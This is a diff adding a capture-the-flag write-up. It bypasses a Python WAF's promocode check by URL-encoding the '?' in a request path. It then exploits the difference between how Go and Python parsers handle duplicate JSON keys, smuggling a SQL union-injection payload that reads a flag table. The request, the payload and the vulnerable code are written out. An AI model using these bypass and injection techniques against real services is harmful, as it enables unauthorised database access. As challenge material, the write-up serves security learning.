@@ -1,0 +1,67 @@
+Step 1: Bypass promocode filter
+
+waf.py
+```
+if('gettoken' in unquote(path)):
+        promo = request.args.get('promocode')
+        creditcard = request.args.get('creditcard')
+
+        if promo == 'FREEWAF':
+            res = jsonify({'err':'Sorry, this promo has expired'})
+            res.status_code = 400
+            return res
+
+        r = requests.get(appHost+path, params={'promocode':promo,'creditcard':creditcard})
+```
+
+It uses request.args to get values from the parameters.
+To bypass these checks, we urlencode the ?, and make a get request to
+/gettoken%3fcreditcard=x&promocode=FREEWAF
+
+Both promo and creditcard variables will be None, and the variable path will contain gettoken?creditcard=x&promocode=FREEWAF
+
+GET /gettoken%3fcreditcard=x&promocode=FREEWAF HTTP/1.1
+```
+Cookie
+token: LQuKU5ViVGk4fsytWt9C
+```
+
+
+Step 2: SQL Injection
+
+To Bypass WAF
+
+JSON
+	Golang buger/jsonparser: first-key precedence
+	Python standard library JSON parser: last-key precedence
+
+Payload
+{
+    "name":"' union select flag, 1, 1, 1 from flag-- -",
+    "name":"x",
+    "min_radius":1,
+    "max_radius":10
+}
+
+waf.py
+```
+if 'name' in j:
+    x = j['name']
+    if not isinstance(x, str) or not x.isalnum():
+        badReq = True
+```
+x = "x"
+
+main.go
+```
+name, err := jsonparser.GetString(reqBody,"name")
+    if (err==nil){
+        nFilt++
+        query += "WHERE name = '" + name + "' "
+    }
+```
+
+name = "' union select flag, 1, 1, 1 from flag-- -"
+
+
+python3 exp.py
